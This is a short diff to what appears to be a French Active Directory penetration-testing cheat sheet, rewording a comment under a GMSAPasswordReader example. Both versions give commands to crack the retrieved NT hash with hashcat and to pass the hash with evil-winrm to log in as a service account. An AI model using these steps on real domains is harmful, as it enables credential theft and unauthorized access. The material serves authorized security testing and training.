@@ -1670,7 +1670,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 # Exemple
 .\GMSAPasswordReader.exe --accountname 'svc_apache'
-# Cela retournera probablement un rc4 hmac (pas l'ancienne valeur), qui est le même qu'un hash NTLM, donc nous pouvons essayer de le fissurer (hashcat -m 1000 '[ntlm_hash]' [wordlist]) ou faire un pass le hash, n'oubliez pas le '$' pour le nom d'utilisateur s'il s'agit d'un compte de service (evil-winrm -i [ip] -u svc apache$ -H [ntlm_hash]).
+# Le résultat peut contenir une clé rc4_hmac liée au hash NT du compte. Préserver les paramètres exacts : hashcat -m 1000 '[ntlm_hash]' [wordlist] ; le compte de service peut être nommé svc_apache$ (exemple source : evil-winrm -i [ip] -u svc_apache$ -H [ntlm_hash]).
 ```
 
 
